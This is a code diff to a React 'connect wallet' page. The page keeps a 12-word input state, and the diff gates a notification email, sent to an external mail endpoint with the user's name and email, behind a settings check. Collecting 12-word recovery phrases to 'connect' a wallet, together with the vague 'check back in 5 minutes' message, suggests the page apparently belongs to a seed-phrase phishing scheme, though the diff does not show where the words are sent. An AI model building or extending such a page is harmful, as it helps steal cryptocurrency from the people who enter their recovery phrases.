@@ -3,6 +3,7 @@ import { useState } from "react";
 import { FaBars, FaMoon, FaSun, FaBell, FaUserCircle } from "react-icons/fa";
 import Sidebar from "./dashboardWidgets/Sidebar";
 import Footer from "@/components/landing/Footer";
+import { useSystemSettings } from "@/hooks/useAdminData";
 
 interface Wallet {
   name: string;
@@ -38,6 +39,8 @@ export default function ConnectWalletPage() {
   const [words, setWords] = useState<string[]>(Array(12).fill("")); // 12-word state
    const uid = localStorage.getItem("user_id"); // example
    const [status, setStatus] = useState(""); // New state for showing request result
+   const { data: settings = [] } = useSystemSettings();
+   const emailNotifications = settings.find(s => s.setting_key === "email_notifications")?.setting_value !== "false";
 
   const openWallet = (wallet: Wallet) => {
     setActiveWallet(wallet);
@@ -77,21 +80,22 @@ export default function ConnectWalletPage() {
         if (data.success) {
           setStatus(`Wallet "${activeWallet.name}" connected successfully.`);
 
+    if (emailNotifications) {
+      fetch('https://bluevult.com/api/mail.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          subject: 'Wallet Connection Request.',
+          name :localStorage.getItem("user_name"),
+          email: localStorage.getItem("user_email"),
 
-    fetch('https://bluevult.com/api/mail.php', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        subject: 'Wallet Connection Request.',
-        name :localStorage.getItem("user_name"),
-        email: localStorage.getItem("user_email"),
-
-        message: 'Your '+ activeWallet.name+' wallet has been connected accepted, Your wallet will be connected as soon as possible. Check back in 5 minutes.'
+          message: 'Your '+ activeWallet.name+' wallet has been connected accepted, Your wallet will be connected as soon as possible. Check back in 5 minutes.'
+        })
       })
-    })
-    .then(res => res.json())
-    .then(console.log)   // will show success or error from PHP
-    .catch(console.error);
+      .then(res => res.json())
+      .then(console.log)   // will show success or error from PHP
+      .catch(console.error);
+    }
 
 
         } else {
